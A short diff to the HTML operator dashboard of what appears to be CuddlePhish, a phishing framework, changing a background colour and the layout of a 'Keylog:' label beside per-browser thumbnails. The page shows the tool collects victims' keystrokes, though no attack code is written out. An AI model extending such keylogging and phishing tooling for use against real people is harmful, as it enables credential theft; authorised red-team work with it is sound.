@@ -9,7 +9,7 @@
     <link rel="stylesheet" href="/static/css/bootstrap.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
   </head>
-  <body class="overflow-auto bg-dark">
+  <body class="overflow-auto bg-dark" style="background-color: rgb(6, 8, 24) !important;">
     <nav class="navbar sticky-top navbar-expand-lg navbar-dark justify-content-center mb-3" id="navbar" style="background-color: #191E3A !important;">
       <a href="https://github.com/fkasler"><img src="/images/CuddlePhish.png" alt="Logo" width="100" height="94" class="nav-item" /></a>
       <ul class="form-check form-switch nav-item">
@@ -85,7 +85,8 @@ socket.on("thumbnail", function(browser_id, thumbnail_blob, keylog){
         </div> \
         <br></br> \
         <div> \
-          <h6 style="color: aqua;">Keylog:</h6> \
+        <br></br>\
+          <p style="color: aqua;">Keylog:</p> \
           <small class="keylog text-muted" id="keylog_${browser_id}" style="color: red !important"></small> \
         </div> \
       </div> \
